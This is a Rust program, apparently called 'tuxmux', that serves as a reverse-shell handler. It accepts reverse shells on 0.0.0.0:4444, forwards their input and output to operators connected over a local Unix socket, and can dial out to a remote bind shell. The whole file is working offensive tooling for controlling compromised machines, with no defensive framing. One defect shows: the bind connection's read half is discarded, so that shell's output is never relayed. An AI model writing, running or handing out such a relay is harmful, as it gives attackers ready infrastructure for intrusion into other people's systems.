use tokio::net::{TcpListener, TcpStream, UnixListener, UnixStream};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::sync::Mutex;
use clap::Parser;
use std::sync::Arc;
use std::path::Path;

#[derive(Parser)]
struct Args {
    #[arg(short = 's', long = "socket", default_value = "/tmp/tuxmux.sock")]
    socket: String,
    #[arg(short = 'p', long = "port", default_value = "4444")]
    port: u16,
    #[arg(short = 'a', long = "address", default_value = "0.0.0.0")]
    address: String,
    #[arg(short = 'b', long = "bind", default_value = "127.0.0.1:4321")]
    bind: String, // optional: remote bind server to connect to
}

type TcpWriters = Arc<Mutex<Vec<tokio::net::tcp::OwnedWriteHalf>>>;
type UnixWriters = Arc<Mutex<Vec<tokio::net::unix::OwnedWriteHalf>>>;

#[tokio::main]
async fn main() -> std::io::Result<()> {
    let args = Args::parse();

    let tcp_writers: TcpWriters = Arc::new(Mutex::new(Vec::new()));
    let unix_writers: UnixWriters = Arc::new(Mutex::new(Vec::new()));

    // Remove existing UNIX socket
    if Path::new(&args.socket).exists() {
        std::fs::remove_file(&args.socket)?;
    }

    // --- TCP listener (reverse shells connect here) ---
    let tcp_listener = TcpListener::bind(format!("{}:{}", args.address, args.port)).await?;
    let tcp_writers_clone = tcp_writers.clone();
    let unix_writers_clone = unix_writers.clone();

    tokio::spawn(async move {
        loop {
            match tcp_listener.accept().await {
                Ok((stream, addr)) => {
                    println!("Shell connected: {}", addr);
                    let (mut reader, writer) = stream.into_split();
                    tcp_writers_clone.lock().await.push(writer);

                    let unix_writers = unix_writers_clone.clone();

                    tokio::spawn(async move {
                        let mut buf = [0u8; 4096];
                        loop {
                            match reader.read(&mut buf).await {
                                Ok(0) => break,
                                Ok(n) => {
                                    let mut u = unix_writers.lock().await;
                                    let mut i = 0;
                                    while i < u.len() {
                                        if u[i].write_all(&buf[..n]).await.is_err() {
                                            u.swap_remove(i);
                                        } else {
                                            i += 1;
                                        }
                                    }
                                }
                                Err(_) => break,
                            }
                        }
                        println!("Shell disconnected");
                    });
                }
                Err(e) => eprintln!("TCP accept error: {}", e),
            }
        }
    });

    // --- UNIX listener (operators connect here) ---
    let unix_listener = UnixListener::bind(&args.socket)?;
    let tcp_writers_clone = tcp_writers.clone();
    let unix_writers_clone = unix_writers.clone();

    tokio::spawn(async move {
        loop {
            match unix_listener.accept().await {
                Ok((stream, _)) => {
                    println!("Operator connected");
                    let (mut reader, writer) = stream.into_split();
                    unix_writers_clone.lock().await.push(writer);

                    let tcp_writers = tcp_writers_clone.clone();

                    tokio::spawn(async move {
                        let mut buf = [0u8; 4096];
                        loop {
                            match reader.read(&mut buf).await {
                                Ok(0) => break,
                                Ok(n) => {
                                    let mut t = tcp_writers.lock().await;
                                    let mut i = 0;
                                    while i < t.len() {
                                        if t[i].write_all(&buf[..n]).await.is_err() {
                                            t.swap_remove(i);
                                        } else {
                                            i += 1;
                                        }
                                    }
                                }
                                Err(_) => break,
                            }
                        }
                        println!("Operator disconnected");
                    });
                }
                Err(e) => eprintln!("UNIX accept error: {}", e),
            }
        }
    });

    // --- Optional: connect to remote bind server ---
    let tcp_writers_clone = tcp_writers.clone();
    let bind_target = args.bind.clone();
    tokio::spawn(async move {
        match TcpStream::connect(&bind_target).await {
            Ok(stream) => {
                println!("Connected to bind server {}", bind_target);
                let (_r, w) = stream.into_split();
                tcp_writers_clone.lock().await.push(w);
            }
            Err(e) => eprintln!("Failed to connect to bind server {}: {}", bind_target, e),
        }
    });

    println!("Listening: TCP {} | UNIX {}", args.port, args.socket);
    loop {
        tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
    }
}